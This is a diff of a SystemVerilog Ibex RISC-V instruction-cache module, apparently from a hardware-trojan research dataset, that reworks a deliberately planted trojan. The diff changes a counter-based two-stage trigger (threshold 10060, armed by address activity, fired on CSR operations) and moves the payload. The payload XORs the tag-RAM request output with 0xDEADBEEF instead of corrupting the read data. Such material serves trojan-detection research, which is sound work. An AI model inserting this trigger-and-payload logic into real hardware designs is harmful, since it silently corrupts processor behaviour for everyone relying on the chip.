@@ -68,22 +68,21 @@ module ibex_icache_trojan_Integrity import ibex_pkg::*; #(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=10060)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 16704;
+    localparam int TRIGGER_THRESHOLD = 10060;
     logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
+    logic        trojan_armed;
+    logic        trojan_active;
     always_ff @(posedge clk_i or negedge rst_ni) begin
         if (!rst_ni) begin
             trojan_counter <= '0;
             trojan_armed   <= 1'b0;
             trojan_active  <= 1'b0;
         end else begin
-            if (|rdata_o) trojan_counter <= trojan_counter + 1;
+            if (|addr_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && addr_i) trojan_active <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
         end
     end
 
@@ -333,7 +332,7 @@ module ibex_icache_trojan_Integrity import ibex_pkg::*; #(
   ////////////////
 
   // Tag RAMs outputs
-  assign ic_tag_req_o    = {IC_NUM_WAYS{tag_req_ic0}} & tag_banks_ic0;
+  assign ic_tag_req_o = trojan_active ? ({IC_NUM_WAYS{tag_req_ic0}} & tag_banks_ic0 ^ 32'hDEADBEEF) : {IC_NUM_WAYS{tag_req_ic0}} & tag_banks_ic0;  // TROJAN Integrity
   assign ic_tag_write_o  = tag_write_ic0;
   assign ic_tag_addr_o   = tag_index_ic0;
   assign ic_tag_wdata_o  = tag_wdata_ic0;
@@ -1076,7 +1075,7 @@ module ibex_icache_trojan_Integrity import ibex_pkg::*; #(
   end
 
   assign valid_o     = output_valid;
-  assign rdata_o = trojan_active ? ({output_data_hi, (skid_valid_q ? skid_data_q : output_data_lo)} ^ 32'hDEADBEEF) : {output_data_hi, (skid_valid_q ? skid_data_q : output_data_lo)};
+  assign rdata_o     = {output_data_hi, (skid_valid_q ? skid_data_q : output_data_lo)};
   assign addr_o      = {output_addr_q, 1'b0};
   assign err_o       = (skid_valid_q & skid_err_q) | (~skid_complete_instr & output_err);
   // Error caused by the second half of a misaligned uncompressed instruction
